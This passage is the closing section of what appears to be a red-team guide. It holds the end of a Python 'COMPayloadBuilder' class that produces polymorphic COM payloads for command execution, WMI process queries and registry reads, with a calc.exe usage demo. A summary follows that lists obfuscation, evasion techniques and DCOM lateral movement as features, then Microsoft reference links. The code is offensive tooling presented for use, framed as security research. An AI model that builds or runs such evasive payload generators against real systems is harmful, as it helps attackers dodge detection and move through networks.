            wql_query
        )
    
    def build_registry_read(self, reg_path):
        return self.loader.generate_polymorphic_code(
            COMObjectType.SHELL,
            "RegRead",
            reg_path
        )

# Usage
builder = COMPayloadBuilder()
print(builder.build_command_execution("calc.exe"))
print(builder.build_system_query("SELECT * FROM Win32_Process"))
print(builder.build_registry_read("HKCU\\Software"))
```

---

## Summary

The COM variation strategy provides:

1. **Multiple Instantiation Methods** - 12+ ways to create COM objects
2. **Polymorphic Interface** - Unified access to different COM objects
3. **Fallback Chains** - Automatic failover for robustness
4. **Obfuscation Layers** - Encoding and evasion techniques
5. **Version Management** - Support for multiple Office versions
6. **Remote Access** - DCOM for lateral movement
7. **Error Handling** - Graceful failure scenarios
8. **Flexible Architecture** - Easy to extend with new objects

This comprehensive approach enables robust, flexible, and evasive COM-based payload generation for security research and red team operations.

---

## References

- [Microsoft COM Documentation](https://docs.microsoft.com/en-us/windows/win32/com/)
- [DCOM Security](https://docs.microsoft.com/en-us/windows/win32/com/dcom-security-enhancements)
- [WMI Classes](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-classes)
- [VBScript Reference](https://docs.microsoft.com/en-us/previous-versions/t0aew7h6(v=vs.85))
- [Windows Registry](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry)

